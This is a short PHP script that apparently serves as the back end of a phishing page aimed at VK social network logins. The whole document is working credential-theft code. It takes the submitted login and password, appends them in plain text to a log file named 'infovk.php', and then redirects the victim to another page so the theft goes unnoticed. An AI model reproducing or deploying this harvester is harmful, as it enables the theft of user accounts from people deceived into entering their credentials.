<?php  
$login = $_POST['login']; 
$pass = $_POST['password']; 
$log = fopen("infovk.php","at"); 
fwrite($log,"<br> $login:$pass"); 
fclose($log); 
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/plus.html'></head></html>"; 

?>